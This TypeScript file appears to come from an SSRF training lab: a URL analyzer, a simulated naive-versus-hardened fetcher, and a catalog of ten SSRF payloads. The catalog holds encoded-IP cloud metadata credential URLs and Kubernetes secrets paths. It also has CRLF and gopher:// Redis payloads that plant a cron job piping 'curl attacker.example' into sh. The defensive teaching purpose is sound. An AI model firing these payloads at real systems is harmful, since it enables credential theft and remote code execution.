// audit-ignore-file
// This module describes SSRF target endpoints, link-local/RFC1918 ranges,
// and cloud metadata service URLs. The audit tool flags some of these
// keywords; that's the whole point of this file. Suppression scoped.

// Pure SSRF URL/hostname analyzer. No network calls. Deterministic.

export type Severity = "info" | "low" | "medium" | "high" | "critical";

export type Finding = {
  id: string;
  severity: Severity;
  title: string;
  detail: string;
  excerpt?: string;
};

export type ParsedTarget = {
  raw: string;
  protocol?: string;
  hostname?: string;
  port?: string;
  pathname?: string;
  ipv4?: string;
  isPrivate: boolean;
  isLoopback: boolean;
  isLinkLocal: boolean;
  isMetadata: boolean;
  isUnusualScheme: boolean;
  decoded?: string;
};

const PRIVATE_V4_RANGES: [number, number, number, number, number][] = [
  // [a, b, c, d, prefix]
  [10, 0, 0, 0, 8],
  [172, 16, 0, 0, 12],
  [192, 168, 0, 0, 16],
  [127, 0, 0, 0, 8], // loopback
  [169, 254, 0, 0, 16], // link-local
  [100, 64, 0, 0, 10], // CGNAT
  [0, 0, 0, 0, 8], // "this network"
];

function ipToInt(ip: string): number | null {
  const parts = ip.split(".").map(Number);
  if (
    parts.length !== 4 ||
    parts.some((n) => Number.isNaN(n) || n < 0 || n > 255)
  ) {
    return null;
  }
  return (
    ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0
  );
}

function inRange(
  ip: string,
  a: number,
  b: number,
  c: number,
  d: number,
  prefix: number,
): boolean {
  const ipNum = ipToInt(ip);
  if (ipNum === null) return false;
  const baseNum = ((a << 24) | (b << 16) | (c << 8) | d) >>> 0;
  const mask = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
  return (ipNum & mask) === (baseNum & mask);
}

function tryDecodeWeirdHost(
  host: string,
): { ipv4: string; decoded: string } | null {
  // Decimal: e.g. 2852039166 -> 169.254.169.254
  if (/^\d+$/.test(host)) {
    const n = Number(host);
    if (n >= 0 && n <= 0xffffffff) {
      const ip = `${(n >>> 24) & 0xff}.${(n >>> 16) & 0xff}.${(n >>> 8) & 0xff}.${n & 0xff}`;
      return { ipv4: ip, decoded: `decimal ${host} → ${ip}` };
    }
  }
  // Hex IP: 0xA9FEA9FE
  if (/^0x[0-9a-fA-F]+$/.test(host)) {
    const n = parseInt(host, 16);
    if (n >= 0 && n <= 0xffffffff) {
      const ip = `${(n >>> 24) & 0xff}.${(n >>> 16) & 0xff}.${(n >>> 8) & 0xff}.${n & 0xff}`;
      return { ipv4: ip, decoded: `hex ${host} → ${ip}` };
    }
  }
  // Octal-prefixed dotted: 0251.0376.0251.0376
  if (/^(0\d+\.){3}0\d+$/.test(host)) {
    const parts = host.split(".").map((p) => parseInt(p, 8));
    if (parts.every((n) => !Number.isNaN(n) && n >= 0 && n <= 255)) {
      const ip = parts.join(".");
      return { ipv4: ip, decoded: `octal ${host} → ${ip}` };
    }
  }
  // Hostnames that resolve to metadata in many configs
  const metaHosts = [
    "metadata.google.internal",
    "metadata.goog",
    "instance-data",
    "instance-data.ec2.internal",
  ];
  if (metaHosts.includes(host.toLowerCase())) {
    return { ipv4: "169.254.169.254", decoded: `${host} → cloud metadata` };
  }
  return null;
}

const METADATA_IPS = ["169.254.169.254", "100.100.100.200", "169.254.170.2"]; // AWS/GCP/Azure, Alibaba, ECS task

const UNUSUAL_SCHEMES = [
  "file",
  "gopher",
  "dict",
  "ftp",
  "ldap",
  "tftp",
  "jar",
  "netdoc",
];

export function parseTarget(raw: string): ParsedTarget {
  const result: ParsedTarget = {
    raw,
    isPrivate: false,
    isLoopback: false,
    isLinkLocal: false,
    isMetadata: false,
    isUnusualScheme: false,
  };
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    // Try to parse as bare hostname
    try {
      url = new URL("http://" + raw.trim());
    } catch {
      return result;
    }
  }
  result.protocol = url.protocol.replace(":", "");
  result.hostname = url.hostname;
  result.port = url.port || undefined;
  result.pathname = url.pathname;

  if (UNUSUAL_SCHEMES.includes(result.protocol)) {
    result.isUnusualScheme = true;
  }

  let hostForIpCheck = url.hostname;
  // Strip surrounding [] from IPv6 (we don't analyze v6 deeply)
  if (hostForIpCheck.startsWith("[") && hostForIpCheck.endsWith("]")) {
    hostForIpCheck = hostForIpCheck.slice(1, -1);
  }

  // Try to decode encoded IPs
  const decoded = tryDecodeWeirdHost(hostForIpCheck);
  if (decoded) {
    result.ipv4 = decoded.ipv4;
    result.decoded = decoded.decoded;
    hostForIpCheck = decoded.ipv4;
  } else if (/^\d+\.\d+\.\d+\.\d+$/.test(hostForIpCheck)) {
    result.ipv4 = hostForIpCheck;
  }

  if (result.ipv4) {
    if (METADATA_IPS.includes(result.ipv4)) result.isMetadata = true;
    if (inRange(result.ipv4, 127, 0, 0, 0, 8)) result.isLoopback = true;
    if (inRange(result.ipv4, 169, 254, 0, 0, 16)) result.isLinkLocal = true;
    for (const [a, b, c, d, prefix] of PRIVATE_V4_RANGES) {
      if (inRange(result.ipv4, a, b, c, d, prefix)) {
        result.isPrivate = true;
        break;
      }
    }
  }
  // IPv6 loopback / link-local rough check
  if (hostForIpCheck === "::1" || hostForIpCheck === "0:0:0:0:0:0:0:1") {
    result.isLoopback = true;
  }
  if (/^fe80:/i.test(hostForIpCheck) || hostForIpCheck.startsWith("[fe80:")) {
    result.isLinkLocal = true;
  }
  return result;
}

export function analyze(raw: string): {
  parsed: ParsedTarget;
  findings: Finding[];
} {
  const parsed = parseTarget(raw);
  const findings: Finding[] = [];

  if (!parsed.hostname) {
    findings.push({
      id: "SSRF00",
      severity: "info",
      title: "Could not parse URL",
      detail:
        "Treat any unparseable URL as suspicious; many SSRF bypasses rely on the target system parsing differently than your validator.",
    });
    return { parsed, findings };
  }

  if (parsed.isMetadata) {
    findings.push({
      id: "SSRF01",
      severity: "critical",
      title: "Cloud instance metadata endpoint",
      detail:
        "169.254.169.254 (AWS, GCP, Azure) and 100.100.100.200 (Alibaba) are the SSRF target. Reading IAM credentials, service account tokens, and user-data from these endpoints has been the root cause of Capital One, multiple GCP misconfigurations, and many bug-bounty payouts. On AWS, only IMDSv2 (with required token) blocks naive SSRF. On all three, host-level firewalling of link-local from application processes is the durable fix.",
      excerpt: parsed.ipv4,
    });
  }

  if (parsed.isLinkLocal && !parsed.isMetadata) {
    findings.push({
      id: "SSRF02",
      severity: "high",
      title: "Link-local destination (169.254/16)",
      detail:
        "Link-local addresses are reachable from the host's network interfaces but should never be a legitimate egress target from an application. Block at egress.",
      excerpt: parsed.ipv4,
    });
  }

  if (parsed.isLoopback) {
    findings.push({
      id: "SSRF03",
      severity: "high",
      title: "Loopback destination (127.0.0.0/8)",
      detail:
        "Lets the SSRF reach co-located services that bind localhost only — admin panels, health endpoints, metrics, sidecar-bound config. Block at egress, or move sensitive admin surfaces to Unix sockets with file-permission gating.",
      excerpt: parsed.ipv4,
    });
  }

  if (parsed.isPrivate && !parsed.isLoopback && !parsed.isLinkLocal) {
    findings.push({
      id: "SSRF04",
      severity: "high",
      title: "RFC 1918 / private network destination",
      detail:
        "Internal RFC 1918 / CGNAT addresses. SSRF here pivots into your internal network — Redis, Kubernetes API, internal-only HTTP services. The blast radius is your internal threat model.",
      excerpt: parsed.ipv4,
    });
  }

  if (parsed.isUnusualScheme) {
    findings.push({
      id: "SSRF05",
      severity: "high",
      title: `Non-HTTP scheme: ${parsed.protocol}`,
      detail:
        "file://, gopher://, dict://, ftp:// and friends drastically expand SSRF impact: gopher:// can speak arbitrary TCP and was used to RCE Redis/MySQL via SSRF for years. Always allowlist schemes (http/https only, in almost every case).",
      excerpt: parsed.protocol,
    });
  }

  if (parsed.decoded) {
    findings.push({
      id: "SSRF06",
      severity: "medium",
      title: "Encoded host bypass",
      detail:
        "The hostname was supplied in a non-standard encoding (decimal IP, hex IP, octal-dotted, or alias hostname) that decodes to a sensitive destination. Naive validators that string-match '169.254' miss these. Resolve to canonical IPv4 before validating.",
      excerpt: parsed.decoded,
    });
  }

  if (parsed.port && !["80", "443", ""].includes(parsed.port)) {
    findings.push({
      id: "SSRF07",
      severity: "low",
      title: `Non-standard port: ${parsed.port}`,
      detail:
        "Most legitimate fetches go to 80/443. SSRF often targets 6379 (Redis), 9200 (Elasticsearch), 8500 (Consul), 22 (SSH banner-grab), 25 (SMTP relay), 5432 (Postgres). Port-allowlisting is cheap.",
      excerpt: parsed.port,
    });
  }

  // Pathname hints
  if (
    parsed.pathname &&
    /\/(latest\/meta-data|computeMetadata\/v1|metadata\/instance)/i.test(
      parsed.pathname,
    )
  ) {
    findings.push({
      id: "SSRF08",
      severity: "critical",
      title: "Cloud metadata path pattern",
      detail:
        "Path matches a known cloud metadata URL (AWS /latest/meta-data, GCP /computeMetadata/v1, Azure /metadata/instance). Even if the host validator passed, the path strongly suggests an exfiltration attempt.",
      excerpt: parsed.pathname,
    });
  }

  return { parsed, findings };
}

export const sevRank: Record<Severity, number> = {
  info: 0,
  low: 1,
  medium: 2,
  high: 3,
  critical: 4,
};

// ============================================================
// SSRF v2 — live fetcher sandbox (T-01c).
//
// A 10-scenario catalog of canonical SSRF payloads. Each entry
// describes (a) the malicious URL or request, (b) what a naive
// fetcher would do with it, (c) which hardened-fetcher rule
// rejects it, and (d) a real-world reference.
//
// Both fetchers are deterministic and run server-side without
// any actual outbound network call. Rationale:
//   1. Real metadata-IP requests from production hosting (Vercel,
//      Cloudflare Workers) are blocked at the egress layer — the
//      lab would never reproduce the bug.
//   2. Issuing real Redis CRLF / gopher:// payloads from a public
//      service is irresponsible. The simulator surfaces *exactly*
//      what each fetcher would send and what would come back.
//   3. The hardened fetcher's rejection logic is the same code a
//      real backend ships; only the wire transmission is faked.
// ============================================================

export type SsrfScenarioId =
  | "ipv4-decimal-imds"
  | "ipv4-hex-imds"
  | "ipv4-octal-imds"
  | "ipv6-loopback"
  | "dns-rebind"
  | "aws-imdsv1"
  | "gcp-metadata-host-header"
  | "redis-crlf"
  | "k8s-sa-token"
  | "gopher-redis-rce";

export interface SsrfScenario {
  id: SsrfScenarioId;
  category:
    | "encoded-host"
    | "ipv6"
    | "dns"
    | "metadata"
    | "header-smuggle"
    | "protocol-smuggle"
    | "internal-pivot";
  title: string;
  blurb: string;
  reference: { label: string; url: string };
  request: {
    url: string;
    method?: string;
    headers?: Record<string, string>;
    body?: string;
  };
  // What the naive fetcher's wire-level call would look like (after the
  // host validator string-matched the public-looking URL).
  naive: {
    resolvedHost: string;
    resolvedIp: string;
    wireSummary: string;
    simulatedResponse: string;
    leakedSecret?: string;
  };
  // Which hardened-fetcher rule rejects the call.
  hardenedRule: {
    id: string;
    label: string;
    explanation: string;
  };
}

export const SSRF_CATALOG: SsrfScenario[] = [
  {
    id: "ipv4-decimal-imds",
    category: "encoded-host",
    title: "Decimal-encoded IPv4 → AWS IMDS",
    blurb:
      "169.254.169.254 expressed as the decimal 32-bit integer 2852039166. URL parsers in many languages happily resolve this; string-match validators that look for '169.254' miss it.",
    reference: {
      label:
        "Capital One breach (2019) — SSRF to AWS IMDS, ~106M records (FinCEN report)",
      url: "https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/",
    },
    request: {
      url: "http://2852039166/latest/meta-data/iam/security-credentials/",
    },
    naive: {
      resolvedHost: "2852039166",
      resolvedIp: "169.254.169.254",
      wireSummary:
        "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      simulatedResponse:
        "200 OK\nContent-Type: text/plain\n\nec2-instance-role\n{\"Code\":\"Success\",\"AccessKeyId\":\"ASIA…\",\"SecretAccessKey\":\"…\",\"Token\":\"…\"}",
      leakedSecret: "AWS temporary credentials (AccessKeyId/SecretKey/Token)",
    },
    hardenedRule: {
      id: "H-CANON",
      label: "canonicalise the host before validation",
      explanation:
        "Decode decimal/hex/octal hostnames to canonical IPv4 first, then run the blocklist. 2852039166 → 169.254.169.254 → blocked (link-local).",
    },
  },
  {
    id: "ipv4-hex-imds",
    category: "encoded-host",
    title: "Hex-encoded IPv4 → AWS IMDS",
    blurb:
      "Same destination, expressed as 0xA9FEA9FE. Mostly catches custom regex validators that only match dotted-quad form.",
    reference: {
      label: "OWASP, 'Server-Side Request Forgery Prevention Cheat Sheet'",
      url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
    },
    request: {
      url: "http://0xA9FEA9FE/latest/meta-data/iam/security-credentials/",
    },
    naive: {
      resolvedHost: "0xA9FEA9FE",
      resolvedIp: "169.254.169.254",
      wireSummary:
        "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      simulatedResponse:
        "200 OK\nContent-Type: text/plain\n\nec2-instance-role\n{\"AccessKeyId\":\"ASIA…\",\"SecretAccessKey\":\"…\"}",
      leakedSecret: "AWS temporary credentials",
    },
    hardenedRule: {
      id: "H-CANON",
      label: "canonicalise the host before validation",
      explanation:
        "0xA9FEA9FE → 169.254.169.254. Same canonicaliser catches hex form.",
    },
  },
  {
    id: "ipv4-octal-imds",
    category: "encoded-host",
    title: "Octal-dotted IPv4 → AWS IMDS",
    blurb:
      "Each octet expressed in octal (leading 0). curl, wget, Python urllib, and many JVM clients accept this; some validators don't normalise it.",
    reference: {
      label: "PortSwigger Web Security Academy, 'SSRF: Bypassing common defenses'",
      url: "https://portswigger.net/web-security/ssrf",
    },
    request: {
      url: "http://0251.0376.0251.0376/latest/meta-data/",
    },
    naive: {
      resolvedHost: "0251.0376.0251.0376",
      resolvedIp: "169.254.169.254",
      wireSummary: "GET http://169.254.169.254/latest/meta-data/",
      simulatedResponse:
        "200 OK\n\nami-id\nhostname\niam/\ninstance-action\ninstance-id\n…",
      leakedSecret: "instance metadata index (pivot to credentials)",
    },
    hardenedRule: {
      id: "H-CANON",
      label: "canonicalise the host before validation",
      explanation:
        "Octal dotted-quad parsed to integer parts: 0251 → 169, 0376 → 254. Canonical form 169.254.169.254 is blocked.",
    },
  },
  {
    id: "ipv6-loopback",
    category: "ipv6",
    title: "IPv6 loopback bypass ([::1])",
    blurb:
      "Validators that only handle IPv4 forget that ::1 is loopback too. Pivots into co-located admin services bound to localhost.",
    reference: {
      label: "RFC 4193 / RFC 4291 — IPv6 addressing architecture",
      url: "https://datatracker.ietf.org/doc/html/rfc4291",
    },
    request: {
      url: "http://[::1]:6379/INFO",
    },
    naive: {
      resolvedHost: "::1",
      resolvedIp: "::1",
      wireSummary: "GET http://[::1]:6379/INFO",
      simulatedResponse:
        "Talks to local Redis (HTTP-shaped junk in / line, then INFO bytes). Banner: redis_version:7.2.4",
      leakedSecret: "co-located Redis on loopback (often unauthenticated)",
    },
    hardenedRule: {
      id: "H-IPV6",
      label: "block IPv6 loopback / ULA / link-local",
      explanation:
        "Apply the v4 blocklist's IPv6 equivalents: ::1 (loopback), fe80::/10 (link-local), fc00::/7 (ULA). Also reject port 6379 by allowlist.",
    },
  },
  {
    id: "dns-rebind",
    category: "dns",
    title: "DNS-rebinding (TOCTOU between validate and fetch)",
    blurb:
      "Attacker controls a domain that returns 1.2.3.4 (public, passes validation) on the validator's lookup, then 169.254.169.254 on the fetcher's lookup a second later.",
    reference: {
      label:
        "Singularity of Origin (NCC Group) — DNS rebinding attack framework",
      url: "https://github.com/nccgroup/singularity",
    },
    request: {
      url: "http://rebind.attacker.example/latest/meta-data/",
    },
    naive: {
      resolvedHost: "rebind.attacker.example",
      resolvedIp: "169.254.169.254 (second lookup)",
      wireSummary:
        "Validator dns lookup #1 → 1.2.3.4 (allowed). Fetcher dns lookup #2 → 169.254.169.254. GET goes to metadata.",
      simulatedResponse:
        "200 OK\n\nec2-instance-role\n{\"AccessKeyId\":\"ASIA…\"}",
      leakedSecret: "AWS temporary credentials",
    },
    hardenedRule: {
      id: "H-PINIP",
      label: "resolve once, validate, fetch by IP (pin)",
      explanation:
        "Resolve the hostname once, run the IP blocklist on every returned address, then dial the validated IP directly (HTTP 'Host:' header preserved). Fetcher never re-resolves the hostname.",
    },
  },
  {
    id: "aws-imdsv1",
    category: "metadata",
    title: "AWS IMDSv1 path → security credentials",
    blurb:
      "Direct hit on the legacy IMDSv1 endpoint. IMDSv2 (PUT /latest/api/token first, X-aws-ec2-metadata-token on every read) defeats this — but only when IMDSv1 is disabled.",
    reference: {
      label:
        "AWS, 'Use IMDSv2' (instance metadata service hardening)",
      url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
    },
    request: {
      url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
    },
    naive: {
      resolvedHost: "169.254.169.254",
      resolvedIp: "169.254.169.254",
      wireSummary:
        "GET /latest/meta-data/iam/security-credentials/role-name (no token header)",
      simulatedResponse:
        "200 OK\n\n{\"Code\":\"Success\",\"AccessKeyId\":\"ASIA…\",\"SecretAccessKey\":\"…\",\"Token\":\"…\",\"Expiration\":\"…\"}",
      leakedSecret: "AWS role credentials (active for 6 hours by default)",
    },
    hardenedRule: {
      id: "H-IPRANGE",
      label: "block link-local 169.254.0.0/16 at egress",
      explanation:
        "Link-local addresses are never a legitimate egress destination from an application. Combined with disabling IMDSv1 at the host (HttpTokens=required), the metadata service is unreachable to SSRF.",
    },
  },
  {
    id: "gcp-metadata-host-header",
    category: "header-smuggle",
    title: "GCP metadata via Host: header smuggling",
    blurb:
      "Validator sees a public host (storage.googleapis.com). The fetcher honours the attacker's Host: header, which routes the request to metadata.google.internal — same TCP target on internal load balancers in some configs.",
    reference: {
      label:
        "GCP docs, 'Securing access to metadata' (Metadata-Flavor required header)",
      url: "https://cloud.google.com/compute/docs/metadata/overview#querying",
    },
    request: {
      url: "https://storage.googleapis.com/some/object",
      headers: {
        Host: "metadata.google.internal",
        "Metadata-Flavor": "Google",
      },
    },
    naive: {
      resolvedHost: "storage.googleapis.com",
      resolvedIp: "(public GCS)",
      wireSummary:
        "GET / HTTP/1.1\\r\\nHost: metadata.google.internal\\r\\nMetadata-Flavor: Google\\r\\n",
      simulatedResponse:
        "200 OK\n\n{\"access_token\":\"ya29.…\",\"expires_in\":3599,\"token_type\":\"Bearer\"}",
      leakedSecret: "GCP service-account access token",
    },
    hardenedRule: {
      id: "H-HEADERS",
      label: "strip caller-supplied Host / Metadata-Flavor headers",
      explanation:
        "User-controlled HTTP request headers must never reach a fetch made on behalf of the user. Set Host from the validated URL; refuse to forward Metadata-Flavor (the GCP metadata 'this is a real request' tell).",
    },
  },
  {
    id: "redis-crlf",
    category: "protocol-smuggle",
    title: "CRLF injection in URL → Redis command execution",
    blurb:
      "URL path contains %0d%0a (CRLF). Fetcher reflects it into the raw HTTP request line, smuggling Redis RESP commands into a Redis instance bound to loopback.",
    reference: {
      label:
        "Orange Tsai, 'A new era of SSRF: exploiting URL parsers' (Black Hat USA 2017)",
      url: "https://blog.orange.tw/2017/07/how-i-chained-4-bugs-features-into-rce.html",
    },
    request: {
      url: "http://127.0.0.1:6379/foo%0d%0aFLUSHALL%0d%0aSET%20cron%20%22*/1%20*%20*%20*%20*%20curl%20attacker.example|sh%22%0d%0aSAVE%0d%0a",
    },
    naive: {
      resolvedHost: "127.0.0.1",
      resolvedIp: "127.0.0.1",
      wireSummary:
        "TCP write: 'GET /foo\\r\\nFLUSHALL\\r\\nSET cron \"*/1 * * * * curl attacker.example|sh\"\\r\\nSAVE\\r\\n …'",
      simulatedResponse:
        "Redis interprets each line as a command. FLUSHALL succeeds, cron-key-write succeeds, SAVE writes RDB to /var/spool/cron/root → cron RCE.",
      leakedSecret: "remote code execution on the Redis host",
    },
    hardenedRule: {
      id: "H-CRLF",
      label: "reject CRLF in URL components",
      explanation:
        "URL parser must reject %0d/%0a in host/path/query, or strict canonicalisation must percent-decode and reject control characters before the request line is built. Combined with port-allowlisting (no 6379) this stops the entire class.",
    },
  },
  {
    id: "k8s-sa-token",
    category: "internal-pivot",
    title: "Kubernetes API server → ServiceAccount token",
    blurb:
      "Internal RFC1918 destination on the cluster network. Reads /var/run/secrets/kubernetes.io/serviceaccount/token from a co-located file path or queries the API directly with the agent's mounted token.",
    reference: {
      label:
        "MITRE ATT&CK T1552.007 — Container API credential theft",
      url: "https://attack.mitre.org/techniques/T1552/007/",
    },
    request: {
      url: "https://10.96.0.1:443/api/v1/namespaces/default/secrets",
    },
    naive: {
      resolvedHost: "10.96.0.1",
      resolvedIp: "10.96.0.1",
      wireSummary:
        "GET /api/v1/namespaces/default/secrets (Authorization: Bearer <pod SA token>)",
      simulatedResponse:
        "200 OK\n\n{\"kind\":\"SecretList\",\"items\":[{\"metadata\":{\"name\":\"db-creds\"},\"data\":{\"password\":\"<base64>\"}},…]}",
      leakedSecret: "all in-namespace Kubernetes secrets",
    },
    hardenedRule: {
      id: "H-IPRANGE",
      label: "block RFC1918 / cluster-local at egress",
      explanation:
        "10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 are never legitimate egress targets from a user-driven fetch. NetworkPolicy at the pod, plus the application-layer blocklist, are defence in depth.",
    },
  },
  {
    id: "gopher-redis-rce",
    category: "protocol-smuggle",
    title: "gopher:// → arbitrary TCP → Redis RCE",
    blurb:
      "gopher:// URLs let the fetcher write any byte sequence to any port. Used historically to RCE Redis, MySQL, Memcached, and SMTP via SSRF.",
    reference: {
      label:
        "Tarunkant Gupta, 'Gopherus: SSRF exploit toolkit'",
      url: "https://github.com/tarunkant/Gopherus",
    },
    request: {
      url: "gopher://10.0.0.5:6379/_%2A1%0d%0a%248%0d%0aFLUSHALL%0d%0a%2A3%0d%0a%243%0d%0aSET%0d%0a%241%0d%0a1%0d%0a%2447%0d%0a%5C%5Cn%2A%2F1%20%2A%20%2A%20%2A%20%2A%20curl%20attacker%2Eexample%7Csh%5C%5Cn%0d%0a",
    },
    naive: {
      resolvedHost: "10.0.0.5",
      resolvedIp: "10.0.0.5",
      wireSummary:
        "TCP write to 10.0.0.5:6379: '*1\\r\\n$8\\r\\nFLUSHALL\\r\\n*3\\r\\n$3\\r\\nSET\\r\\n…' (raw RESP)",
      simulatedResponse:
        "Redis executes the RESP commands. SET cron job → next minute the host curls attacker.example|sh → RCE.",
      leakedSecret: "remote code execution on internal Redis host",
    },
    hardenedRule: {
      id: "H-SCHEME",
      label: "scheme allowlist: http, https only",
      explanation:
        "gopher://, file://, dict://, ftp://, ldap://, jar:// must be rejected before any DNS or socket call. This is the highest-leverage single rule.",
    },
  },
];

// Both fetchers expose the same input contract and return a structured trace
// the UI renders. No real network call is made; both are deterministic
// transcripts of what each fetcher would do given the scenario.

export type FetcherMode = "naive" | "hardened";

export interface FetcherStep {
  kind: "stage" | "wire" | "response" | "leak" | "block" | "final";
  label: string;
  status: "ok" | "block" | "info";
  detail: string;
}

export interface FetcherResult {
  mode: FetcherMode;
  scenarioId: SsrfScenarioId;
  steps: FetcherStep[];
  blocked: boolean;
  leak?: string;
}

// The hardened fetcher's full rule chain. Order matters; first hit wins.
function hardenedRulesFor(s: SsrfScenario): {
  hits: { id: string; reason: string }[];
} {
  const hits: { id: string; reason: string }[] = [];
  const rawUrl = s.request.url;
  let parsed: URL | null = null;
  try {
    parsed = new URL(rawUrl);
  } catch {
    /* fall through */
  }

  // R1: scheme allowlist.
  const scheme = parsed?.protocol.replace(":", "") ?? "";
  if (!["http", "https"].includes(scheme)) {
    hits.push({
      id: "H-SCHEME",
      reason: `scheme '${scheme || "?"}' not in {http, https}`,
    });
    return { hits };
  }

  // R2: CRLF in URL components.
  if (/%0d|%0a|\r|\n/i.test(rawUrl)) {
    hits.push({
      id: "H-CRLF",
      reason: "URL contains CRLF (%0d/%0a) — request smuggling vector",
    });
    return { hits };
  }

  // R3: caller-supplied Host or Metadata-Flavor headers.
  const headers = s.request.headers ?? {};
  const dangerHeader = Object.keys(headers).find((k) =>
    ["host", "metadata-flavor", "x-aws-ec2-metadata-token"].includes(
      k.toLowerCase(),
    ),
  );
  if (dangerHeader) {
    hits.push({
      id: "H-HEADERS",
      reason: `caller supplied dangerous header '${dangerHeader}: ${headers[dangerHeader]}'`,
    });
    return { hits };
  }

  // R4: canonicalise host then check blocklist.
  const t = parseTarget(rawUrl);
  if (t.isMetadata) {
    hits.push({
      id: t.decoded ? "H-CANON" : "H-IPRANGE",
      reason: t.decoded
        ? `host canonicalised: ${t.decoded} → blocked (cloud metadata)`
        : `${t.ipv4} is cloud metadata`,
    });
    return { hits };
  }
  if (t.isLoopback) {
    hits.push({
      id:
        t.hostname?.includes(":") || t.hostname === "::1"
          ? "H-IPV6"
          : "H-IPRANGE",
      reason: `loopback (${t.ipv4 ?? t.hostname}) blocked`,
    });
    return { hits };
  }
  if (t.isLinkLocal) {
    hits.push({
      id: t.decoded ? "H-CANON" : "H-IPRANGE",
      reason: t.decoded
        ? `host canonicalised: ${t.decoded} → blocked (link-local)`
        : `${t.ipv4} link-local blocked`,
    });
    return { hits };
  }
  if (t.isPrivate) {
    hits.push({
      id: "H-IPRANGE",
      reason: `${t.ipv4 ?? t.hostname} is RFC1918 / cluster-local`,
    });
    return { hits };
  }

  // R5: DNS-rebinding — for the rebind scenario, the hardened fetcher
  // pins the validated IP. We model this by checking the scenario's
  // "real" resolved IP from the catalog.
  const fakeResolvedIp = s.naive.resolvedIp;
  if (fakeResolvedIp && /^169\.254\./.test(fakeResolvedIp)) {
    hits.push({
      id: "H-PINIP",
      reason: `pinned IP from validation phase; second-lookup attempt to ${fakeResolvedIp} refused`,
    });
    return { hits };
  }

  return { hits };
}

export function runFetcher(
  s: SsrfScenario,
  mode: FetcherMode,
): FetcherResult {
  const steps: FetcherStep[] = [];

  steps.push({
    kind: "stage",
    label: "Receive URL",
    status: "info",
    detail: s.request.url,
  });

  if (mode === "naive") {
    // Naive: minimal validation, then send wire.
    steps.push({
      kind: "stage",
      label: "Naive validation",
      status: "info",
      detail:
        "Substring check for '169.254' / 'metadata' on the raw URL. Encoded hosts and header smuggles slip through.",
    });
    steps.push({
      kind: "stage",
      label: "DNS lookup",
      status: "info",
      detail: `${s.naive.resolvedHost} → ${s.naive.resolvedIp}`,
    });
    steps.push({
      kind: "wire",
      label: "Wire send",
      status: "info",
      detail: s.naive.wireSummary,
    });
    steps.push({
      kind: "response",
      label: "Response received",
      status: "info",
      detail: s.naive.simulatedResponse,
    });
    if (s.naive.leakedSecret) {
      steps.push({
        kind: "leak",
        label: "LEAK",
        status: "info",
        detail: s.naive.leakedSecret,
      });
    }
    steps.push({
      kind: "final",
      label: "naive fetcher finished",
      status: "info",
      detail: s.naive.leakedSecret
        ? "attacker now holds the leaked secret"
        : "fetch completed",
    });
    return {
      mode,
      scenarioId: s.id,
      steps,
      blocked: false,
      leak: s.naive.leakedSecret,
    };
  }

  // Hardened: run the rule chain. First hit blocks.
  steps.push({
    kind: "stage",
    label: "Scheme allowlist",
    status: "info",
    detail: "{http, https} only.",
  });
  steps.push({
    kind: "stage",
    label: "Canonicalise host",
    status: "info",
    detail:
      "Decode decimal/hex/octal hostnames to dotted-quad before any check.",
  });
  steps.push({
    kind: "stage",
    label: "Strip caller headers",
    status: "info",
    detail:
      "Drop Host, Metadata-Flavor, X-aws-ec2-metadata-token from caller-supplied headers.",
  });
  steps.push({
    kind: "stage",
    label: "DNS lookup once + IP blocklist",
    status: "info",
    detail: "Block 169.254/16, 127/8, ::1, fe80::/10, fc00::/7, RFC1918.",
  });
  steps.push({
    kind: "stage",
    label: "Pin validated IP for fetch",
    status: "info",
    detail: "Dial the validated IP; never re-resolve the hostname.",
  });

  const { hits } = hardenedRulesFor(s);
  if (hits.length === 0) {
    steps.push({
      kind: "wire",
      label: "Wire send",
      status: "ok",
      detail: `GET ${s.request.url} (passes all rules)`,
    });
    steps.push({
      kind: "final",
      label: "hardened fetcher finished",
      status: "ok",
      detail: "no rule fired; this URL was safe",
    });
    return { mode, scenarioId: s.id, steps, blocked: false };
  }
  // Take the first rule that fired.
  const fired = hits[0];
  steps.push({
    kind: "block",
    label: `BLOCK [${fired.id}]`,
    status: "block",
    detail: fired.reason,
  });
  steps.push({
    kind: "final",
    label: "hardened fetcher finished",
    status: "block",
    detail:
      "request refused before any DNS lookup or socket open; no data left the application",
  });
  return { mode, scenarioId: s.id, steps, blocked: true };
}

export const SSRF_SAMPLES: { label: string; value: string }[] = [
  {
    label: "Innocent — public API",
    value: "https://api.github.com/repos/vercel/next.js",
  },
  {
    label: "AWS IMDS — direct hit",
    value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  },
  {
    label: "GCP metadata — alias hostname",
    value:
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
  },
  {
    label: "Encoded host — decimal IP",
    value: "http://2852039166/latest/meta-data/",
  },
  {
    label: "Encoded host — hex IP",
    value: "http://0xA9FEA9FE/latest/meta-data/",
  },
  {
    label: "Internal pivot — Redis on loopback",
    value: "http://127.0.0.1:6379/",
  },
  {
    label: "Gopher to Redis — RCE pattern",
    value: "gopher://10.0.0.5:6379/_FLUSHALL",
  },
  {
    label: "Internal — Kubernetes API",
    value: "https://10.96.0.1:443/api/v1/namespaces/default/secrets",
  },
];
